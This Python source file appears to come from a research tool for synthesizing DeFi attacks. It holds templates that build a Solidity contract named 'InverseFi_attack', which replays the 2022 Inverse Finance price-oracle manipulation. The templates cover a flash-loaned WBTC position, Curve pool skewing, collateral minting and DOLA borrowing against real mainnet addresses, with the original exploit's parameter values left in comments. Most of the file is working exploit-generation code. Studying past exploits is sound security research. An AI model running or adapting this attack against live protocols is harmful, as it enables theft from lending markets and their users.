import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict
from Actions.Utils import *
from Actions.UtilsPrecision import *


class InverseFiAction():    
    initialStates = [87636422, 4042, 294784, 3186, 88]
    globalStates = initialStates.copy()
    # globalStates[0]: USDTWBTCWETHPool USDT Liquidity
    # globalStates[1]: USDTWBTCWETHPool WBTC Liquidity
    # globalStates[2]: USDTWBTCWETHPool totalSupply
    # globalStates[3]: yvCurve3Crypto totalSupply
    # globalStates[4]: yvCurve3Crypto crvcryptoBalance



    initialBalances = {"WBTC": 27000}
    currentBalances = initialBalances.copy()
    TokenPrices = {'WBTC': 20369.90, "Dola": 1.0, "USDT": 1.0}
    TargetTokens = TokenPrices.keys()

    startStr_contract = '''// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "ds-test/test.sol";
import "./interfaces/InverseFiI.sol";

// Transaction hash
// 0x958236266991bc3fe3b77feaacea120f172c0708ad01c7a715b255f218f9313c
// Status
// Success
// Timestamp
// 2022-06-16 08:47:58(UTC)
// Block number
// 14972419

contract InverseFi_attack is DSTest {
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);
    IERC20 crvcrypto =IERC20(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);
    IERC20 CRV = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    VyperContract yvCurve3Crypto= VyperContract(0xE537B5cc158EB71037D4125BDD7538421981E6AA);
    CErc20Interface anYvcrvCrypto  = CErc20Interface(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587);


    ICurvePool USDTWBTCWETHPool = ICurvePool(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
    VyperContract curveRegistry = VyperContract(0x8e764bE4288B842791989DB5b8ec067279829809);
    ICurvePool dola3pool3crv = ICurvePool(0xAA5A67c256e27A5d80712c51971408db3370927D);
    ICurvePool curve3pool  = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);

    IUnitroller Unitroller = IUnitroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);
    IAggregator YVcrvCryptoFeed = IAggregator(0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C);

    CErc20Interface InverseFinanceDola = CErc20Interface(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);

    uint256[3] amounts;


    string str1;
    string str2;
    string str3;
    string str4;
    string str5;
    string str6;

    string str89;
    string str90;
    string str91;
    string str92;
    string str93;
    string str94;
    string str95;


    
    constructor() public {
        WBTC.approve(address(USDTWBTCWETHPool),type(uint256).max);
        WBTC.approve(address(curveRegistry),type(uint256).max);
        usdt.approve(address(curveRegistry),type(uint256).max); 
        DOLA.approve(address(curveRegistry),type(uint256).max); 
        crvcrypto.approve(0xE537B5cc158EB71037D4125BDD7538421981E6AA,type(uint256).max);
        yvCurve3Crypto.approve(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587,type(uint256).max);
        // allow to borrow from crvcrypto
        address[] memory toEnter = new address[](1);
        toEnter[0] = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587 ;
        Unitroller.enterMarkets(toEnter);
    }


    '''
    
    startStr_attack = '''
    // ================== flash loan of 27000 WBTC ==========================    
    function attack( $$_$$ ) public {
        '''

    endStr_attack = '''        revert(ProfitSummary());
    }
'''

    endStr_contract =  '''

    receive() payable external{}

    function CurveBalanceSummary() internal returns (string memory _uintAsString){
        uint balance1 = curve3pool.balances(0) / 10 ** 18; // DAI
        uint balance2 = curve3pool.balances(1) / 10 ** 6; // USDC
        uint balance3 = curve3pool.balances(2) / 10 ** 6; // USDT
        str89 = append("DAI liquidity: ", uint2str(balance1));
        str90 = append(" USDC liquidity: ", uint2str(balance2));
        str91 = append(" USDT liquidity: ", uint2str(balance3));
        return append(append(str89, str90), str91);
    }


    function yvCurve3CryptoSummary() public returns (string memory) {
        uint totalSupply = yvCurve3Crypto.totalSupply() / 1e18;   
        uint crvcryptoBalance = crvcrypto.balanceOf(address(yvCurve3Crypto)) / 1e18;
        str89 = append("totalSupply: ", uint2str(totalSupply));   
        str90 = append("crvcryptoBalance: ", uint2str(crvcryptoBalance));
        return appendWithSpace(str89, str90);
    }
    

    function dola3pool3crvSummary() public returns (string memory) {
        uint DolaBalance = dola3pool3crv.balances(0) / 1e18;
        uint CRVBalance = dola3pool3crv.balances(1) / 1e18;
        str89 = append("DolaBalance: ", uint2str(DolaBalance));
        str90 = append("CRVBalance: ", uint2str(CRVBalance));
        return appendWithSpace(str89, str90);
    }


    function USDTWBTCWETHPoolSummaryWithLQ() public returns (string memory) {
        uint USDTLiquidity = USDTWBTCWETHPool.balances(0) / 1e6;
        uint WBTCLiquidity = USDTWBTCWETHPool.balances(1) / 1e8;
        (,uint LQint,) = Unitroller.getAccountLiquidity(address(this));
        str89 = append("USDT Liquidity: ", uint2str(USDTLiquidity));
        str90 = append("WBTC Liquidity: ", uint2str(WBTCLiquidity));
        str91 = append("LQ of address(this): ", uint2str(LQint / 1e18));
        return appendWithSpace(str89, appendWithSpace(str90, str91));
    }


    function USDTWBTCWETHPoolSummary() public returns (string memory) {
        uint USDTLiquidity = USDTWBTCWETHPool.balances(0) / 1e6;
        uint WBTCLiquidity = USDTWBTCWETHPool.balances(1) / 1e8;
         (,uint LQint,) = Unitroller.getAccountLiquidity(address(this));
        str89 = append("USDT Liquidity: ", uint2str(USDTLiquidity));
        str90 = append("WBTC Liquidity: ", uint2str(WBTCLiquidity));
        return appendWithSpace(str89, str90);
    }


    function crvcryptoSummary() public returns (string memory) {
        uint totalSupply = crvcrypto.totalSupply() / 1e18;   
        return append("totalSupply: ", uint2str(totalSupply));   
    }


    function ProfitSummary() public returns (string memory) {
        uint WBTCBalance = WBTC.balanceOf(address(this))/1e8;
        uint DolaBalance = DOLA.balanceOf(address(this))/1e18;
        uint USDTBalance = usdt.balanceOf(address(this))/1e6;
        
        str1 = append("WBTC Balance: ", uint2str(WBTCBalance));
        str2 = append("Dola Balance: ", uint2str(DolaBalance));
        str3 = append("USDT Balance: ", uint2str(USDTBalance));
        return appendWithSpace(str1, appendWithSpace(str2, str3));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}

    '''


    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    @classmethod
    def calcProfit(cls, stats):
        if stats == None or len(stats) != 3:
            return 0
        profit = (stats[0] - cls.initialBalances["WBTC"]) * cls.TokenPrices["WBTC"] + stats[1] + stats[2]
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit


    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)

    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)
            

    def initialPass():
        action1 = AddLiquidityUSDTWBTCWETHPool # USDTWBTCWETHPool  LQ
        action2 = DeposityvCurve3Crypto # yvCurve3Crypto
        action3 = MintanYvcrvCrypto # USDTWBTCWETHPool  LQ
        action4 = ExchangeWBTC2USDT # USDTWBTCWETHPool  LQ
        action5 = BorrowInverseFinance
        action6 = ExchangeUSDT2WBTC # USDTWBTCWETHPool  LQ

        action_list_1 = [action1, action2, action3, action4, action6]
        action1_prestate_dependency = [action3, action4, action6]
        action2_prestate_dependency = [action1, action2]
        action3_prestate_dependency = [action1, action2, action4, action5, action6]
        action4_prestate_dependency = [action1, action2, action3, action4, action6]
        action6_prestate_dependency = [action1, action2, action3, action4, action6]

        # seq of actions

        ActionWrapper = InverseFiAction
        action_lists = [action1_prestate_dependency + [action1], \
                        action2_prestate_dependency + [action2], \
                        action3_prestate_dependency + [action3], \
                        action4_prestate_dependency + [action4], \
                        action6_prestate_dependency + [action6], \
        ]


        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))

    
    def runinitialPass():
        return




class AddLiquidityUSDTWBTCWETHPool(InverseFiAction):
    points = []
    values = [[], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None   

    # Action Specific Variables
    numInputs = 1
    tokensIn = ["WBTC"]
    tokensOut = ["CRVCrypto"]
    range = [0, 500]  # 225

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        amounts = [0, $$ * 1e8, 0];
        USDTWBTCWETHPool.add_liquidity(amounts,0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''         str1 = USDTWBTCWETHPoolSummary();
        str2 = crvcryptoSummary();
        uint crvcryptoGot = crvcrypto.balanceOf(address(this));

        amounts = [0, $$ * 1e8, 0];
        USDTWBTCWETHPool.add_liquidity(amounts,0); 

        crvcryptoGot = (crvcrypto.balanceOf(address(this)) -  crvcryptoGot) / 1e18;
        str3 = USDTWBTCWETHPoolSummary();
        str4 = crvcryptoSummary();
        revert( appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(str3, appendWithSpace(str4, uint2str(crvcryptoGot)))) );
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1 = cls.aliquotValues(values) 
        cls.values[0].append(v0)  # totalSupply
        cls.values[1].append(v1)  # CRVCrypto got

        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0, 1, -1])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0, 1, -1])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        output0 = None
        output1 = None
        inputs = [cls.globalStates[0], cls.globalStates[1], cls.globalStates[2], input]
        new_inputs = [inputs[0], inputs[1], inputs[-1]]

        output0 = cls.approximator0(new_inputs)
        output1 = cls.approximator1(new_inputs)

        return output0, output1

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances["WBTC"] -= input
        
        output0, output1 = cls.simulate(input) 

        cls.globalStates[1] += input

        # output1 =  output0 - cls.globalStates[2]
        cls.globalStates[2] = output0

        if "CRVCrypto" not in cls.currentBalances:
            cls.currentBalances["CRVCrypto"] = output1
        else:
            cls.currentBalances["CRVCrypto"] += output1
        return


    @classmethod
    def string(cls):
        return cls.__name__
    

class DeposityvCurve3Crypto(InverseFiAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    # Action Specific Variables
    numInputs = 1
    tokensIn = ["CRVCrypto"]
    tokensOut = ["yvCurve3Crypto"]
    range = [0, 7000]  # 5375

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += "        yvCurve3Crypto.deposit($$ * 1e18,address(this));\n"
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = yvCurve3CryptoSummary();
        uint yvCurve3CryptoGot = yvCurve3Crypto.balanceOf(address(this));

        yvCurve3Crypto.deposit($$ * 1e18,address(this));

        yvCurve3CryptoGot = ( yvCurve3Crypto.balanceOf(address(this)) - yvCurve3CryptoGot) / 1e18;
        str2 = yvCurve3CryptoSummary();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(yvCurve3CryptoGot))));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1, v2 = cls.aliquotValues(values) 
        cls.values[0].append(v0)  # 
        cls.values[1].append(v1)  # 
        cls.values[2].append(v2)  # 

        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[3], cls.globalStates[4],  input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        output0, output1, output2 = cls.simulate(input) 

        # TODOs: how to use the outputs?
        cls.globalStates[3] = output0
        cls.globalStates[4] = output1

        if "yvCurve3Crypto" not in cls.currentBalances:
            cls.currentBalances["yvCurve3Crypto"] = output2
        else:
            cls.currentBalances["yvCurve3Crypto"] += output2

        return

    @classmethod
    def string(cls):
        return cls.__name__


class MintanYvcrvCrypto(InverseFiAction):
    points = []
    values = [[]]

    hasNewDataPoints = True
    approximator0 = None

    # Action Specific Variables
    numInputs = 1
    tokensIn = ["yvCurve3Crypto"]
    tokensOut = ["LQ"]
    range = [0, 5000] #  4906

    # TODO: Add actionStr and CollectorStr
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += "        anYvcrvCrypto.mint($$ * 1e18);\n"
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = USDTWBTCWETHPoolSummary();
        (,uint LQinit,) = Unitroller.getAccountLiquidity(address(this));

        anYvcrvCrypto.mint($$ * 1e18);

        (,uint LQafter,) = Unitroller.getAccountLiquidity(address(this));
        uint LQGot = (LQafter - LQinit) / 1e18;
        str2 = USDTWBTCWETHPoolSummary();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(LQGot))));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0 = cls.aliquotValues(values) 
        cls.values[0].append(v0)  # 

        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])

        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        return output0

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        output0 = cls.simulate(input) 

        # TODOs: how to use the outputs?
        if "LQ" not in cls.currentBalances:
            cls.currentBalances["LQ"] = output0
        else:
            cls.currentBalances["LQ"] += output0


    @classmethod
    def string(cls):
        return cls.__name__


class ExchangeWBTC2USDT(InverseFiAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None

    # Action Specific Variables
    numInputs = 1
    # TODO: Add tokens and ranges here
    tokensIn = ["WBTC"]
    tokensOut = ["USDT"]
    range = [0, 30000] #  26775

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += "        curveRegistry.exchange(address(USDTWBTCWETHPool),address(WBTC),address(usdt), $$ * 1e8 , 0, address(this));\n"
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = USDTWBTCWETHPoolSummaryWithLQ();
        uint USDTGot = usdt.balanceOf(address(this));
        
        curveRegistry.exchange(address(USDTWBTCWETHPool),address(WBTC),address(usdt), $$ * 1e8 , 0, address(this));

        USDTGot = (usdt.balanceOf(address(this)) - USDTGot) / 1e6;
        str2 = USDTWBTCWETHPoolSummaryWithLQ();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(USDTGot))));
        '''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1, v2, v3 = cls.aliquotValues(values) 
        cls.values[0].append(v0)  # USDT Liquidity
        cls.values[1].append(v1)  # WBTC Liquidity
        cls.values[2].append(v2)  # LQ of address(this)
        cls.values[3].append(v3)  # USDT got

        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0, 1, -1])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0, 1, -1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3], [0, 1, -1])

        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        if "LQ" not in cls.currentBalances:
            cls.currentBalances["LQ"] = 0

        inputs = [cls.globalStates[0], cls.globalStates[1], cls.currentBalances["LQ"],  input]
        new_inputs = [inputs[0], inputs[1], inputs[-1]]
        output0 = cls.approximator0(new_inputs)
        output1 = cls.approximator1(new_inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(new_inputs)
        return output0, output1, output2, output3

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        output0, output1, output2, output3 = cls.simulate(input) 

        cls.currentBalances["WBTC"] -= input
        
        # TODOs: how to use the outputs?
        # output3 = cls.globalStates[0] - output0
        cls.globalStates[0] = output0
        cls.globalStates[1] += input
        cls.currentBalances["LQ"] = output2

        if "USDT" not in cls.currentBalances:
            cls.currentBalances["USDT"] = output3
        else:
            cls.currentBalances["USDT"] += output3
        return

    @classmethod
    def string(cls):
        return cls.__name__


class BorrowInverseFinance(InverseFiAction):
    numInputs = 1
    tokensIn = ["LQ"]
    tokensOut = ["Dola"]
    range = [0, 10133949 ] # 10133949


    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        InverseFinanceDola.borrow($$ * 1e18);\n'''
        return action


    @classmethod
    def transit(cls, input):  # Assume input is a value
        
        cls.currentBalances["LQ"] -= input

        if "Dola" not in cls.currentBalances:
            cls.currentBalances["Dola"] = input
        else:
            cls.currentBalances["Dola"] += input


    @classmethod
    def string(cls):
        return cls.__name__


class ExchangeUSDT2WBTC(InverseFiAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    # Action Specific Variables
    numInputs = 1
    tokensIn = ["USDT"]
    tokensOut = ["WBTC"]
    range = [0, 80000000] # 75403376

    # TODO: Add actionStr and CollectorStr
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += "        curveRegistry.exchange(address(USDTWBTCWETHPool),address(usdt),address(WBTC),$$ * 1e6,0,address(this));\n"
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = USDTWBTCWETHPoolSummary();
        uint WBTCGot = WBTC.balanceOf(address(this));

        curveRegistry.exchange(address(USDTWBTCWETHPool),address(usdt),address(WBTC),$$ * 1e6,0,address(this));
        
        WBTCGot = (WBTC.balanceOf(address(this)) - WBTCGot) / 1e8;
        str2 = USDTWBTCWETHPoolSummary();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(WBTCGot))));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1, v2 = cls.aliquotValues(values) 
        cls.values[0].append(v0)  # USDT Liquidity
        cls.values[1].append(v1)  # WBTC Liquidity
        cls.values[2].append(v2)  # WBTC got

        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])

        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1],  input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        output0, output1, output2 = cls.simulate(input) 

        # TODOs: how to use the outputs?
        cls.globalStates[0] +=  input
        output2 = cls.globalStates[1] - output1
        cls.globalStates[1] = output1
        cls.currentBalances["USDT"] -= input
        if "WBTC" not in cls.currentBalances:
            cls.currentBalances["WBTC"] = output2
        else:
            cls.currentBalances["WBTC"] += output2
        return

    @classmethod
    def string(cls):
        return cls.__name__


class ExchangeDOLA2CRV(InverseFiAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    # Action Specific Variables
    numInputs = 1
    tokensIn = ["Dola"]
    tokensOut = ["CRV"]
    range = [0, 12000000]  # 10133949

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += "        curveRegistry.exchange(address(dola3pool3crv),address(DOLA),address(CRV),$$ * 1e18,0,address(this));\n"
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        uint DolaCost = DOLA.balanceOf(address(this));
        uint CRVGot = CRV.balanceOf(address(this));
        str1 = dola3pool3crvSummary();

        curveRegistry.exchange(address(dola3pool3crv),address(DOLA),address(CRV),$$ * 1e18,0,address(this));

        DolaCost = (DolaCost - DOLA.balanceOf(address(this))) / 1e18;
        CRVGot = (CRV.balanceOf(address(this)) - CRVGot) / 1e18;
        str2 = dola3pool3crvSummary();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(CRVGot))));
        '''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)

        v0, v1, v2 = cls.aliquotValues(values) 
        cls.values[0].append(v0)  # DolaBalance
        cls.values[1].append(v1)  # CRVBalance
        cls.values[2].append(v2)  # CRV got

        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])

        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[5], cls.globalStates[6],  input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        output0, output1, output2 = cls.simulate(input) 

        # TODOs: how to use the outputs?
        cls.globalStates[5] = output0
        cls.globalStates[6] = output1
        cls.currentBalances["Dola"] -= input
        if "CRV" not in cls.currentBalances:
            cls.currentBalances["CRV"] = output2
        else:
            cls.currentBalances["CRV"] += output2

        return

    @classmethod
    def string(cls):
        return cls.__name__





def main():

    # config.method
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 1
    config.ETHorBSCorDVDorFantom = 0
    config.initialEther = 0
    config.blockNum = 14972419
    config.contract_name = "InverseFi_attack"

    
# # Test for initial pass of data collecton: 
    InverseFiAction.initialPass()
    # InverseFiAction.runinitialPass()

    # action1 = AddLiquidityUSDTWBTCWETHPool
    # action2 = DeposityvCurve3Crypto
    # action3 = MintanYvcrvCrypto
    # action4 = ExchangeWBTC2USDT
    # action5 = BorrowInverseFinance
    # action6 = ExchangeUSDT2WBTC

    # action_list = [action1, action2, action3, action4, action5, action6]
    # initial_guess = [225, 5375, 4906, 26775, 10133949, 75403376]

    # ActionWrapper = InverseFiAction

    # # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    # actual_profit = 2515606
    # print("actual profit: ", actual_profit)
    # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # return actual_profit, e1, e2, e3, e4



if __name__ == "__main__":
    main()
    